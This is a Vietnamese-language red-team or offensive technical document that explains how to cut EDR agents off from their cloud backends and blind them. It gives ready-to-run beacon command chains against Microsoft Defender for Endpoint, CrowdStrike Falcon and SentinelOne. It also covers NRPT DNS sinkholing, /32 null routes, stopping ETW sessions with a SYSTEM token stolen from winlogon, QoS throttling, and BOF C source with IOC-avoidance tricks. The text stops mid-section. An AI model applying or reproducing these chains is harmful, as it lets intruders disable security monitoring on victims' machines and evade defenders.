# Phân Tích Chain Block EDR

> Bản tiếng Anh: [edr-block-chain-analysis.md](edr-block-chain-analysis.md)

## Tổng Quan

EDR hiện đại giao tiếp với cloud backend qua nhiều kênh độc lập. Chặn một kênh duy nhất thường không đủ — hầu hết agent đều có logic fallback, tự động thử kênh khác khi kênh chính bị lỗi. Tài liệu này map toàn bộ các kênh giao tiếp, xác định từng kỹ thuật chặn tương ứng với từng tầng, và cung cấp ba chain đầy đủ cho ba EDR thương mại phổ biến nhất.

---

## 1. Kiến Trúc Giao Tiếp của EDR

```
  ┌──────────────────────────────────────────────────────────────────────┐
  │                         Tiến Trình EDR Agent                         │
  │  (MsSense.exe / CSFalconService.exe / SentinelAgent.exe)            │
  │                                                                      │
  │  ┌────────────┐   ┌───────────────┐   ┌──────────────────────────┐  │
  │  │ Telemetry  │   │  ETW Consumer │   │  Cập nhật Policy/Config  │  │
  │  │ Uploader   │   │  (đọc ETW     │   │  (tải rule phát hiện,    │  │
  │  │ (HTTPS/    │   │   sessions)   │   │   signature từ cloud)    │  │
  │  │  gRPC)     │   └───────┬───────┘   └──────────┬───────────────┘  │
  │  └─────┬──────┘           │                      │                  │
  └────────┼──────────────────┼──────────────────────┼──────────────────┘
           │                  │ (kernel events)       │
           │         ┌────────▼────────┐              │
           │         │  ETW Subsystem  │              │
           │         │  (NTOSKRNL)     │              │
           │         │  Sessions:      │              │
           │         │  - Sense        │              │
           │         │  - ETW-TI       │              │
           │         │  - Falcon       │              │
           │         └─────────────────┘              │
           │                                          │
           ▼                                          ▼
  ┌─────────────────────────────────────────────────────────────────────┐
  │                     Windows Network Stack                           │
  │                                                                     │
  │  ┌──────────────┐   ┌──────────────┐   ┌───────────────────────┐   │
  │  │  DNS Client  │   │  TCP/IP      │   │  TLS / HTTP.sys       │   │
  │  │  (dnscache)  │   │  (tcpip.sys) │   │  (schannel.dll)       │   │
  │  │              │   │              │   └───────────────────────┘   │
  │  │  1. hosts    │   │  Routing     │                               │
  │  │  2. cache    │   │  table       │                               │
  │  │  3. NRPT  ◄──┼───┼─── RULE     │                               │
  │  │  4. DNS srv  │   │  CỦA TA ──► │                               │
  │  └──────────────┘   │  /32 routes │                               │
  │                     └──────────────┘                               │
  │                                                                     │
  │  ┌──────────────────────────────────────────────────────────────┐  │
  │  │  QoS / pacer.sys                                             │  │
  │  │  Giới hạn băng thông theo process (edrchoker — BOF hiện có) │  │
  │  └──────────────────────────────────────────────────────────────┘  │
  └─────────────────────────────────────────────────────────────────────┘
           │
           ▼
  ┌─────────────────────────────────────────────────────────────────────┐
  │                     Card Mạng Vật Lý                                │
  │                     (packet chỉ ra ngoài khi tất cả                 │
  │                      các tầng trên đều cho phép)                    │
  └─────────────────────────────────────────────────────────────────────┘
           │
           ▼
  ┌─────────────────────────────────────────────────────────────────────┐
  │                     EDR Cloud Backend                               │
  │  MDE:    *.security.microsoft.com  *.wdcp.microsoft.com            │
  │  CS:     *.falcon.crowdstrike.com  *.cloudsink.net                 │
  │  S1:     *.sentinelone.net         *.pax.sentinelone.net           │
  └─────────────────────────────────────────────────────────────────────┘
```

---

## 2. Phân Tích Tầng — Kỹ Thuật Nào Chặn Tầng Nào

```
  KÊNH TRUYỀN THÔNG          BỊ CHẶN BỞI         CƠ CHẾ
  ─────────────────────────────────────────────────────────────────────
  Phân giải DNS               nrpt_sinkhole       Rule NRPT chuyển hướng
  (domain -> IP lookup)                           về 127.0.0.2 / SERVFAIL

  Kết nối TCP đến IP          null_route          Route /32 ép traffic
  hardcoded (không dùng DNS)                      vào loopback →
                                                  RST ngay lập tức

  Thông lượng mạng            edrchoker           QoS pacer.sys cap:
  (sau khi kết nối)                               8 bps — TLS handshake
                                                  mất ~6000 giây

  Sự kiện kernel ETW          etw_tamper          ControlTraceW STOP:
  (behavioral telemetry)                          session bị xóa,
                                                  consumer nhận NOTFOUND

  Chặn tầng WFP               (BOF riêng)         xem 01_wfp_block.c
  (deep packet filter)
  ─────────────────────────────────────────────────────────────────────
```

### Tại Sao Từng Kỹ Thuật Hoạt Động ở Tầng OS

#### nrpt_sinkhole — Inject Rule NRPT vào Registry

Windows DNS Client (dịch vụ `dnscache`, chạy trong `svchost.exe -k NetworkService`) xử lý toàn bộ DNS query trong user-space TRƯỚC KHI forward lên kernel resolver. Mỗi lần có query, nó duyệt danh sách NRPT policy ở:

```
HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\DnsPolicyConfig\
```

Mỗi subkey là một rule. Dịch vụ `dnscache` parse field `Name` (kiểu `REG_MULTI_SZ`) như một pattern namespace và so sánh với FQDN của query. Nếu khớp, giá trị `DNSServers` sẽ ghi đè DNS server được cấu hình trên adapter cho query đó.

Khi đặt `DNSServers = "127.0.0.2"`, DNS query sẽ được gửi tới `127.0.0.2:53` qua UDP. Không có service nào bind vào `127.0.0.2:53`, nên:
- UDP: không có response → query timeout → trả SERVFAIL cho application
- Application nhận `WSAHOST_NOT_FOUND` hoặc lỗi socket tương tự

EDR agent không được thông báo khi bảng NRPT bị sửa đổi. Thay đổi có hiệu lực ngay sau khi gọi `DnsFlushResolverCache()` (BOF tự gọi tự động) hoặc khi TTL của các câu trả lời đã cache hết hạn.

**Call path nội bộ:**
```
Application: getaddrinfo("endpoint.microsoft.com", ...)
  -> DnsQuery (dnsapi.dll)
  -> RPC tới dịch vụ dnscache
  -> dnscache: check bảng NRPT
  -> tìm thấy rule khớp -> chuyển hướng tới 127.0.0.2:53
  -> UDP query tới 127.0.0.2:53 -> ETIMEDOUT
  -> trả WSANO_DATA / SERVFAIL về application
```

**Ví dụ thực tế với MDE:**
Khi `MsSense.exe` cần gửi telemetry:
1. Gọi `getaddrinfo("endpoint.microsoft.com")`
2. `dnsapi.dll` → RPC → `dnscache`
3. `dnscache` check NRPT: thấy rule `edrchoker_A3F2B819` khớp với `*.endpoint.microsoft.com`
4. Gửi UDP query tới `127.0.0.2:53` → timeout sau ~5 giây
5. `getaddrinfo` trả về lỗi → `MsSense.exe` không kết nối được

#### null_route — Blackhole /32 trong Routing Table

Bảng forwarding IPv4 (xem qua `route print` hoặc API `GetIpForwardTable`) được quản lý bởi `tcpip.sys`. Khi kernel route một TCP SYN packet đi ra ngoài, nó thực hiện **Longest-Prefix-Match (LPM)** lookup. Route `/32` với mask `0xFFFFFFFF` là entry specific nhất có thể — luôn **thắng** bất kỳ route nào khác đến IP đó (subnet `/24`, default gateway `/0`).

Bằng cách đặt next-hop của `/32` là `127.0.0.1` trên loopback interface:
1. Kernel route packet SYN vào loopback adapter
2. Loopback driver giao packet cho TCP stack nội bộ
3. TCP stack tìm socket bind vào destination IP (ví dụ `52.183.0.1`)
4. Không có socket nào bind vào IP đó trên loopback
5. TCP stack gửi RST về socket đang connect
6. `connect()` trả về `WSAECONNREFUSED` ngay lập tức
7. **Không một packet nào thoát ra NIC vật lý**

Đây là enforcement ở tầng OS — không cần WFP rule, không cần firewall userspace. `tcpip.sys` đưa ra quyết định routing TRƯỚC KHI packet được trao cho NIC driver.

**Tại sao kỹ thuật này cover được hardcoded IP:**
Một số EDR agent biên dịch IP cloud vào trong binary (hoặc cache vào disk từ lần lookup DNS trước) và dùng trực tiếp không qua DNS. NRPT sinkhole không có tác dụng với loại kết nối này. Route `/32` chặn chúng bất kể IP được lấy từ đâu.

**Ví dụ thực tế:**
```
Trước khi add route:
  MsSense.exe → connect(52.183.20.1:443) → route lookup: "dùng default gateway" → packet ra NIC → kết nối thành công

Sau khi add route:
  null_route 52.183.20.1  →  thêm vào routing table: 52.183.20.1/32 via 127.0.0.1
  MsSense.exe → connect(52.183.20.1:443) → route lookup: khớp /32 → loopback
  → TCP stack: không có server nào bind 52.183.20.1 → gửi RST
  → connect() trả WSAECONNREFUSED trong <1ms
  → không có byte nào ra NIC
```

#### etw_tamper — Dừng ETW Session

ETW (Event Tracing for Windows) là kênh telemetry kernel chính của Windows. Kiến trúc:

```
  Kernel provider (ví dụ: Microsoft-Windows-Kernel-Process)
    -> EtwWrite() syscall (NtTraceEvent)
    -> ETW logger thread trong ntoskrnl
    -> ghi event vào session buffer
    -> session buffer flush tới consumer

  Consumer (EDR)
    -> OpenTrace() + ProcessTrace() trên named session
    -> đọc event theo thời gian thực
```

Khi `ControlTraceW(0, sessionName, props, EVENT_TRACE_CONTROL_STOP)` được gọi:
1. ETW subsystem đánh dấu session là "đang dừng"
2. Nội dung buffer còn lại được flush cho consumer (lần cuối)
3. Session handle bị hủy
4. Lời gọi `ProcessTrace()` của consumer trả về `ERROR_WMI_INSTANCE_NOT_FOUND` (0x80071069)
5. Event processing loop của EDR thoát ra hoặc throw lỗi
6. Tất cả kernel event tương lai lẽ ra đi vào session này đều **bị drop silently** — provider không nhận bất kỳ lỗi nào

**Tại sao cần SYSTEM token:**
ETW session do system service tạo ra có security descriptor đặt `NT AUTHORITY\SYSTEM` làm owner. Gọi `ControlTrace` trên session không phải của mình đòi hỏi privilege ngang bằng owner. Một token Administrator (kể cả elevated, có `SeSecurityPrivilege`) vẫn bị từ chối.

**Luồng steal SYSTEM token từ winlogon:**
```
CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)
  -> tìm winlogon.exe (luôn chạy SYSTEM, luôn có mặt trên session tương tác)
  -> OpenProcess(PROCESS_QUERY_INFORMATION, winlogon_pid)
  -> OpenProcessToken(hProc, TOKEN_DUPLICATE)
  -> DuplicateToken(hToken, SecurityImpersonation)
  -> SetThreadToken(NULL, hDup)   <- thread hiện tại đang impersonate SYSTEM
  -> ControlTraceW(...)           <- gọi với quyền SYSTEM
  -> SetThreadToken(NULL, NULL)   <- revert về token gốc
```

**Những gì EDR mất đi:**
- Session `Microsoft-Windows-Threat-Intelligence` (ETW-TI): không còn event tạo process, event kết nối mạng, event cấp phát memory. Đây là nguồn tín hiệu behavioral chính của MDE.
- `CrowdStrike-Falcon-Sensor`: không còn process event, file system event. Kernel sensor telemetry của CS bị cắt hoàn toàn.
- `SentinelOne-Sensor`: tương tự, Deep Visibility telemetry của S1 bị ngắt.

#### edrchoker — Bóp Băng Thông QoS (BOF hiện có)

Dù DNS và routing chưa bị chặn hoàn toàn (ví dụ EDR kết nối lại qua IP mới), `pacer.sys` vẫn enforce giới hạn băng thông 8 bps theo process. Ở mức 8 bps:
- TLS 1.3 ClientHello (~320 byte) mất 320 giây để truyền
- Một batch telemetry đầy đủ (thường 1–100 KB) mất 1.000–100.000 giây

Thực tế là zero throughput với mọi chức năng EDR thực tế.

---

## 3. Chain Thực Chiến

### Chain A: Microsoft Defender for Endpoint (MDE)

**Tên process EDR:** `MsSense.exe`, `MsSenseS.exe`, `SenseNdr.exe`  
**Domain cloud:** `*.endpoint.microsoft.com`, `*.wdcp.microsoft.com`,
  `*.ods.opinsights.azure.com`, `*.security.microsoft.com`,
  `*.events.data.microsoft.com`  
**ETW sessions:** `Microsoft-Windows-Sense`,
  `Microsoft-Windows-Threat-Intelligence`  
**Dải IP cloud thường gặp:** 20.190.x.x, 52.183.x.x, 13.89.x.x (Azure)

**Các lệnh beacon theo từng bước:**

```
# Bước 1: Dừng ETW trước — làm mù behavioral detection ngay lập tức
etw_tamper mde

# Bước 2: Sinkhole toàn bộ domain DNS của MDE
nrpt_sinkhole *.endpoint.microsoft.com;*.wdcp.microsoft.com;*.ods.opinsights.azure.com;*.security.microsoft.com;*.events.data.microsoft.com

# Bước 3: Blackhole các IP range MDE đã biết (cover hardcoded IP)
#   (lấy IP hiện tại: netstat -anob | findstr MsSense)
null_route 20.190.128.1;20.190.129.1;52.183.20.1;13.89.176.1

# Bước 4: Giới hạn QoS làm failsafe (cover IP/domain ta bỏ sót)
edrchoker MsSense.exe;MsSenseS.exe;SenseNdr.exe
```

**Kết quả đạt được:**
- ETW session bị tear down → MDE không nhận được kernel behavioral event
- DNS bị sinkhole → domain lookup thất bại với SERVFAIL
- Route /32 → kết nối tới hardcoded IP nhận RST ngay
- QoS cap → mọi kết nối thoát qua đều bị throttle về 8 bps

**Hành vi MDE dự kiến sau chain:**
Process MDE vẫn chạy nhưng vào trạng thái "disconnected". Quét on-disk tại chỗ vẫn hoạt động. Behavioral detection (real-time protection qua ETW-TI) bị vô hiệu hóa. Cloud sandbox detonation, cloud ML inference, và upload telemetry đều thất bại.

---

### Chain B: CrowdStrike Falcon

**Tên process EDR:** `CSFalconService.exe`, `CSFalconContainer.exe`,
  `falconhost.exe` (phiên bản cũ), `CsFalconD.exe`  
**Domain cloud:** `*.falcon.crowdstrike.com`, `*.cloudsink.net`,
  `ts01-*.cloudsink.net` (telemetry sinks), `*.crowdstrike.com`  
**ETW sessions:** `CrowdStrike-Falcon-Sensor`,
  `CrowdStrike-Falcon-Operational`  
**Dải IP cloud thường gặp:** 35.232.x.x, 34.102.x.x (GCP)

**Các lệnh beacon theo từng bước:**

```
# Bước 1: Dừng CrowdStrike ETW sessions
etw_tamper crowdstrike

# Bước 2: Sinkhole CrowdStrike DNS domains
nrpt_sinkhole *.falcon.crowdstrike.com;*.cloudsink.net;*.crowdstrike.com

# Bước 3: Blackhole IP cloud CrowdStrike
#   (lấy IP hiện tại: Resolve-DnsName ts01-b.cloudsink.net)
null_route 35.232.0.1;34.102.200.1;34.102.201.1

# Bước 4: QoS throttle làm failsafe
edrchoker CSFalconService.exe;CSFalconContainer.exe
```

**Hành vi CrowdStrike dự kiến sau chain:**
Falcon sensor vào "reduced functionality mode" — heuristic phòng ngừa local vẫn chạy nhưng real-time telemetry upload thất bại. Falcon console hiển thị sensor là "offline" trong vòng ~5 phút. Các cập nhật detection policy từ cloud không đến được sensor.

---

### Chain C: SentinelOne

**Tên process EDR:** `SentinelAgent.exe`, `SentinelServiceHost.exe`,
  `SentinelStaticEngine.exe`, `SentinelHelperService.exe`  
**Domain cloud:** `*.sentinelone.net`, `*.pax.sentinelone.net`,
  `usea1.pax.sentinelone.net`, `eap-prod-*.sentinelone.net`  
**ETW sessions:** `SentinelOne-Sensor`, `SentinelOne-Operational`  
**Dải IP cloud thường gặp:** 54.x.x.x, 3.x.x.x (AWS us-east-1)

**Các lệnh beacon theo từng bước:**

```
# Bước 1: Dừng SentinelOne ETW sessions
etw_tamper sentinelone

# Bước 2: Sinkhole SentinelOne DNS domains
nrpt_sinkhole *.sentinelone.net;*.pax.sentinelone.net

# Bước 3: Blackhole IP cloud SentinelOne
#   (lấy IP hiện tại: Resolve-DnsName usea1.pax.sentinelone.net)
null_route 54.80.0.1;3.213.0.1;3.214.0.1

# Bước 4: QoS throttle làm failsafe
edrchoker SentinelAgent.exe;SentinelServiceHost.exe
```

**Hành vi SentinelOne dự kiến sau chain:**
Agent SentinelOne vào "disconnected mode". Phân tích tĩnh tại chỗ (StaticAI) và behavioral AI (BEHAVIOURAL_AI) vẫn chạy nhưng không upload được dữ liệu. Deep Visibility telemetry (nguồn forensics chính) dừng hẳn. Console hiển thị agent là "Disconnected" và policy sync thất bại.

---

## 4. Điểm Yếu và Rủi Ro Còn Lại

### Điểm Yếu của nrpt_sinkhole

| Rủi Ro | Mô Tả | Cách Khắc Phục |
|--------|--------|----------------|
| DNS cache còn lại | Nếu MDE đã resolve domain trước khi install sinkhole, câu trả lời cache vẫn còn cho đến khi TTL hết hạn. BOF tự gọi `DnsFlushResolverCache()`. | Chạy `ipconfig /flushdns` thủ công làm backup. |
| Hardcoded IP | Một số EDR cache IP cloud ra disk (file config hoặc registry) và bypass DNS. NRPT không có tác dụng. | Dùng `null_route` song song. |
| DoH (DNS over HTTPS) | Nếu EDR dùng DoH resolver riêng, NRPT bị bypass hoàn toàn. DoH đi thẳng qua HTTPS port 443. | Dùng `null_route` block IP của DoH endpoint, hoặc `edrchoker` throttle process. |
| IPv6 | NRPT rule áp dụng cho DNS IPv4 (bản ghi A). AAAA lookup và kết nối IPv6 không bị ảnh hưởng. | Tắt IPv6 trên adapter hoặc thêm rule IPv6 riêng. |
| Phát hiện registry | Một số EDR theo dõi HKLM policy key để phát hiện thay đổi. | Áp dụng ETW tamper trước để giảm khả năng giám sát của EDR. |

### Điểm Yếu của null_route

| Rủi Ro | Mô Tả | Cách Khắc Phục |
|--------|--------|----------------|
| IP rotation | Cloud backend dùng Anycast hoặc thay đổi IP thường xuyên. Route /32 cho IP hôm nay sẽ vô dụng vào ngày mai. | Kết hợp với NRPT để IP mới (từ DNS) không lấy được. |
| IPv6 routes | `MIB_IPFORWARDROW` chỉ cho IPv4. IPv6 route cần `CreateIpForwardEntry2` với `MIB_IPFORWARD_ROW2`. | Thêm null route IPv6 riêng, hoặc tắt IPv6. |
| Persistence sau reboot | Route do `CreateIpForwardEntry` tạo không phải lúc nào cũng tồn tại sau reboot (tùy `dwForwardProto`). Route NETMGMT (proto=3) thường bị xóa khi reboot. | Cài lại route sau reboot, hoặc dùng persistent route store. |
| Phát hiện route | `route print` hiển thị các entry /32. EDR đủ paranoid có thể tự kiểm tra routing table của mình. | ETW tamper giảm khả năng giám sát trước khi add route. |

### Điểm Yếu của etw_tamper

| Rủi Ro | Mô Tả | Cách Khắc Phục |
|--------|--------|----------------|
| Session restart | EDR service có thể phát hiện mất session và tự restart ETW session (nhiều agent có watchdog thread cho việc này). | Chạy lại `etw_tamper` định kỳ, hoặc dùng `edrchoker` để làm chậm watchdog loop của EDR. |
| Telemetry kênh khác | Một số EDR (đặc biệt MDE) còn dùng `PsSetCreateProcessNotifyRoutine` kernel callback, minifilter callback, và object callback độc lập với ETW. Các kênh này không bị ảnh hưởng bởi ETW session teardown. | Kết hợp với edrchoker throttle để upload telemetry không thể thực hiện dù event local vẫn được capture. |
| Truy cập WinLogon | Nếu Beacon chạy với token bị giới hạn (low-integrity hoặc sandboxed), `OpenProcess(winlogon)` có thể thất bại. | Đảm bảo Beacon chạy trong process elevated high-integrity. |
| Alert EDR console | Nhiều EDR vendor phát hiện mất ETW-TI session từ phía server (họ thấy telemetry dừng đột ngột) và tạo alert "sensor disconnected". | Đây là trade-off: phát hiện local bị dừng, nhưng SOC có thể được cảnh báo. Trong operation thời gian nhạy cảm, chấp nhận rủi ro này. |
| Tên session không rõ | Vendor có thể dùng tên session không có tài liệu, không có trong danh sách mặc định. | Dùng `logman query` hoặc `etwtrace list` để enumerate session đang chạy trước, sau đó truyền tên tùy chỉnh vào BOF. |

### Điểm Yếu của edrchoker (BOF hiện có, ghi lại để hoàn chỉnh)

| Rủi Ro | Mô Tả | Cách Khắc Phục |
|--------|--------|----------------|
| Bypass QoS | Một số process bypass QoS bằng cách dùng raw socket hoặc gọi ở priority cao. | Không khả thi với EDR agent chuẩn dùng WinHTTP / WinSock. |
| Phát hiện WMI watchdog | WMI permanent subscription là cơ chế persistence được biết đến rộng rãi và được nhiều EDR giám sát. | Áp dụng ETW tamper trước khi install watchdog. |
| Phạm vi policy | `AppPathNameMatchCondition` khớp theo tên process (không phải đường dẫn đầy đủ). Process đổi tên thành `MsSense.exe` cũng bị throttle. | Chấp nhận side effect này hoặc thêm path matching nếu có. |

### Tóm Tắt Rủi Ro Chain Kết Hợp

```
  KỸ THUẬT          RỦI RO PHÁT HIỆN   HIỆU QUẢ       KHẢ NĂNG PHỤC HỒI
  ──────────────────────────────────────────────────────────────────────
  nrpt_sinkhole      THẤP               CAO             CAO (xóa key)
                     (ghi registry,     (chặn DNS)      (xóa rule,
                     không có           
                     process event)                      flush cache)

  null_route         THẤP               CAO             CAO (xóa route)
                     (thay đổi routing, (chặn IP)
                     không có
                     process event)

  etw_tamper         TRUNG BÌNH         CAO             THẤP (session mất,
                     (EDR có thể thấy   (không có        EDR phải tự restart
                     session dừng;      kernel event)    session)
                     SOC khả năng
                     nhận alert)

  edrchoker          TRUNG BÌNH         CAO             CAO (xóa WMI
                     (WMI subscription  (0 throughput)   subscription)
                     có thể bị phát
                     hiện)
  ──────────────────────────────────────────────────────────────────────
```

**Thứ tự thực hiện được khuyến nghị:**
1. `etw_tamper` trước — giảm khả năng giám sát local của EDR trước khi làm các bước khác
2. `nrpt_sinkhole` — chặn DNS trước khi EDR kịp tạo kết nối mới
3. `null_route` — chặn hardcoded IP
4. `edrchoker` — failsafe throughput cap cho các kết nối lọt qua

Thứ tự này thu hẹp tối đa khoảng thời gian mà EDR đang bị suy yếu một phần nhưng vẫn còn khả năng phát hiện và báo cáo hoạt động suy yếu đó.

---

## 5. Cơ Chế Sâu — edrchoker và QoS Architecture

### 5.1 pacer.sys — Kernel Driver Thực Thi QoS

`pacer.sys` là kernel driver có từ Windows XP. Nó được load bởi service `Psched` (QoS Packet Scheduler) và nằm trong network stack ở tầng **NDIS intermediate driver**, tức là giữa TCP/IP và NIC driver:

```
  Application (MsSense.exe)
     ↓ WinSock
  tcpip.sys          ← routing, TCP state machine
     ↓
  pacer.sys          ← QoS enforcement (HERE)
     ↓
  NDIS miniport driver
     ↓
  NIC hardware
```

**Luồng xử lý của pacer.sys:**
1. Khi TCP/IP gửi một packet xuống, pacer.sys intercept trước khi đến NIC
2. Với mỗi packet, pacer.sys tra bảng policy theo process name của socket chủ
3. Nếu process nằm trong policy với throttle rate = 8 bps:
   - pacer.sys tính lượng token bucket còn lại theo Leaky Bucket algorithm
   - Nếu không đủ token: packet bị giữ lại trong queue
   - Thực tế: 8 bps → 1 byte/giây → 1 byte cần đúng 1 giây để được phép ra
4. Packet chỉ được forward xuống NIC khi token bucket đủ

**Kết quả thực tế ở 8 bps:**
| Payload | Thời gian truyền |
|---------|-----------------|
| TLS ClientHello (~320 byte) | ~320 giây |
| HTTP GET nhỏ nhất (~100 byte) | ~100 giây |
| Telemetry batch 1 KB | ~1,000 giây |
| Telemetry batch 100 KB | ~100,000 giây (≈ 28 giờ) |

Không cần chặn hoàn toàn — 8 bps là zero từ góc nhìn ứng dụng.

### 5.2 MSFT_NetQosPolicySettingData — WMI Class Quản Lý QoS

`MSFT_NetQosPolicySettingData` là WMI class trong namespace `ROOT\StandardCimv2`, được cung cấp bởi service `NetQosSvc` (Network QoS Policy service). Đây là management interface chính thức của Microsoft để quản lý pacer.sys policy.

**Chuỗi gọi từ BOF đến pacer.sys:**
```
BOF: IWbemServices::PutInstance()
  ↓
wbemcore.dll (WMI provider host)
  ↓
NetQosSvc service (svchost.exe -k netsvcs)
  ↓
DeviceIoControl(pacer.sys device)
  ↓
pacer.sys: cập nhật bảng policy trong kernel memory
  ↓
Traffic bị throttle ngay lập tức (ActiveStore)
```

**Hai loại Store:**

| Store | Lưu ở đâu | Hiệu lực | Sau reboot |
|-------|-----------|----------|-----------|
| `ActiveStore` | Kernel memory (pacer.sys) | Ngay lập tức | MẤT |
| `PersistentStore` | WMI Repository (`%SystemRoot%\System32\wbem\Repository\OBJECTS.DATA`) | Sau reboot | CÒN |

**edrchoker_v2 ghi cả hai** — do đó policy vừa active ngay, vừa tồn tại sau reboot.

### 5.3 Tại Sao Persist Sau Khi EDR Restart

`AppPathNameMatchCondition` match **theo tên process**, không phải PID. Khi pacer.sys nhận policy với `AppPathNameMatchCondition = "MsSense.exe"`:

1. Policy được lưu trong kernel state (ActiveStore) và WMI repository (PersistentStore)
2. Khi **MsSense.exe** khởi động lại: TCP/IP tạo socket mới, socket được associate với PID mới của `MsSense.exe`
3. pacer.sys intercept packet đầu tiên từ socket đó, lookup bảng policy theo process name
4. Tìm thấy policy → throttle ngay từ byte đầu tiên

**Flowchart EDR process restart:**
```
EDR bị kill hoặc tự restart
  ↓
EDR process mới khởi động (PID mới)
  ↓
EDR tạo socket: connect("endpoint.microsoft.com:443")
  ↓
pacer.sys intercept packet
  ↓
Lookup: tên process của socket này = "MsSense.exe"
  ↓
Tìm thấy policy: ThrottleRateAction = "8"
  ↓
Throttle apply ngay → TLS handshake không thể hoàn thành
```

Không cần watchdog. Đây là lý do v2 không cần WMI subscription.

**Sau reboot toàn hệ thống:**
1. `NetQosSvc` start (trước EDR)
2. NetQosSvc đọc WMI PersistentStore từ `OBJECTS.DATA`
3. Gửi IOCTL đến pacer.sys: restore policy
4. pacer.sys có policy trong kernel memory trước khi EDR start
5. EDR start → bị throttle ngay từ đầu

---

## 6. Giải Thích Code Chi Tiết — edrchoker_v2.bof.c

### 6.1 Cấu Trúc Tổng Quan

```
edrchoker_v2.bof.c
├── Dynamic imports: OLE32, OLEAUT32, KERNEL32
├── GUIDs: IWbemLocator CLSID và IID (không dùng GUID từ ole32.lib)
├── Helpers: WNextTok, WAppend, RandName
├── WMI property helpers: PutBstr, PutByte, SpawnWmiInst
├── QoS operations: CreatePolicyInStore, CreatePolicy
│                   BuildRemoveWQL, ExecDeleteQuery
│                   ListPolicies
├── WMI connection: WmiConnect
└── go(): parse args → dispatch theo mode
```

### 6.2 Random Name Generation (RandName)

```c
static DWORD g_randS = 0;  // LCG seed — in BSS, zeroed by BOF loader

static void RandName(wchar_t* out, int n) {
    static const wchar_t pool[] =
        L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    if (!g_randS) g_randS = KERNEL32$GetTickCount() | 1;
    for (int i = 0; i < n; i++) {
        g_randS = g_randS * 1664525u + 1013904223u;
        out[i] = pool[(g_randS >> 16) % 62];
    }
    out[n] = L'\0';
}
```

**Chi tiết:**
- Seed `g_randS` lấy từ `GetTickCount()` (milliseconds since boot), OR với 1 để đảm bảo seed không bao giờ = 0 (LCG với seed 0 sẽ cho chuỗi hằng số)
- LCG parameters: multiplier=1664525, increment=1013904223 — đây là tham số Knuth (TAOCP vol.2), phân phối tốt
- `>> 16`: lấy high bits vì low bits của LCG lặp nhanh hơn high bits
- Pool 62 ký tự → 62^8 ≈ 218 nghìn tỷ combination → không có IOC tĩnh trong binary
- `g_randS` là `static DWORD` trong BSS → BOF loader zero-init → `GetTickCount()` được gọi khi seed = 0

**Tại sao quan trọng:** Policy name là field `Name` trong WMI. Nếu dùng tên cố định như "EDRChoker-Policy", EDR có thể detect bằng cách kiểm tra name. Tên random mỗi lần install loại bỏ IOC này.

### 6.3 Token Parser (WNextTok)

```c
static wchar_t* WNextTok(wchar_t** c) {
    wchar_t* s = *c;
    if (!s || !*s) return NULL;
    while (*s == L';') s++;       // skip leading semicolons
    if (!*s) { *c = s; return NULL; }
    wchar_t* p = s;
    while (*p && *p != L';') p++; // find end of token
    if (*p == L';') { *p = L'\0'; *c = p + 1; }  // terminate, advance cursor
    else            { *c = p; }                    // at end of string
    return s;
}
```

**Dùng như sau:**
```c
wchar_t* c = buf;  // buf = L"MsSense.exe;elastic-endpoint.exe"
wchar_t* tok;
while ((tok = WNextTok(&c)) != NULL) {
    // tok = "MsSense.exe", rồi "elastic-endpoint.exe"
}
```

Tokenizer in-place: null-terminate token trực tiếp trong buffer. Không VirtualAlloc. Không CRT.

### 6.4 WMI Instance Creation (SpawnWmiInst + PutBstr/PutByte)

```c
static BOOL SpawnWmiInst(IWbemServices* svc, const wchar_t* cls,
                          IWbemClassObject** ppOut) {
    BSTR b = OLEAUT32$SysAllocString(cls);
    IWbemClassObject* pC = NULL;
    HRESULT hr = svc->lpVtbl->GetObject(svc, b, 0, NULL, &pC, NULL);
    OLEAUT32$SysFreeString(b);
    if (FAILED(hr)) return FALSE;
    hr = pC->lpVtbl->SpawnInstance(pC, 0, ppOut);
    pC->lpVtbl->Release(pC);
    return SUCCEEDED(hr);
}
```

**Sequence:**
1. `GetObject("MSFT_NetQosPolicySettingData")` → lấy class definition object
2. `SpawnInstance()` → tạo instance mới (blank object với schema của class)
3. Sau đó dùng `PutBstr`/`PutByte` để set properties

**Tại sao dùng BSTR:**
WMI COM interface yêu cầu string dưới dạng BSTR (length-prefixed wchar_t với COM memory allocator). Không thể truyền `wchar_t*` trực tiếp — `SysAllocString` convert và allocate, `SysFreeString` free đúng allocator.

### 6.5 CreatePolicyInStore — Ghi QoS Policy

```c
static BOOL CreatePolicyInStore(IWbemServices* svc, const wchar_t* proc,
                                  const wchar_t* name, const wchar_t* store) {
    IWbemClassObject* pInst = NULL;
    if (!SpawnWmiInst(svc, L"MSFT_NetQosPolicySettingData", &pInst))
        return FALSE;

    wchar_t instId[48];                     // InstanceID = "<name>\<store>"
    int ip = 0;
    ip = WAppend(instId, ip, 48, name);
    ip = WAppend(instId, ip, 48, L"\\");
    ip = WAppend(instId, ip, 48, store);
    instId[ip] = L'\0';

    PutBstr(pInst, L"Name",                      name);
    PutBstr(pInst, L"InstanceID",                instId);
    PutBstr(pInst, L"AppPathNameMatchCondition",  proc);    // <-- process name matching
    PutBstr(pInst, L"ThrottleRateAction",         L"8");    // 8 bps — PHẢI là string, không phải int
    PutByte(pInst, L"IPProtocolMatchCondition",   3);       // 3 = TCP+UDP
    PutByte(pInst, L"NetworkProfile",             0);       // 0 = apply to all profiles
    PutBstr(pInst, L"Owner",                      L"machine"); // machine scope, không phải user

    HRESULT hr = svc->lpVtbl->PutInstance(svc, pInst,
        WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    pInst->lpVtbl->Release(pInst);
    return SUCCEEDED(hr);
}
```

**Những lỗi thường gặp khi implement:**

| Property | Kiểu WMI | Giá trị đúng | Lỗi nếu sai |
|----------|----------|-------------|------------|
| `ThrottleRateAction` | `VT_BSTR` (uint64 as string) | `L"8"` | `0x80041008` nếu dùng VT_UI8 |
| `Owner` | `VT_BSTR` | `L"machine"` | PutInstance fail nếu để trống hoặc set integer |
| `InstanceID` | `VT_BSTR` | `"<name>\\ActiveStore"` | WMI reject nếu format sai |
| `AppPathNameMatchCondition` | `VT_BSTR` | `L"MsSense.exe"` | Chỉ filename, không full path |

**Tại sao `ThrottleRateAction` phải là string:**
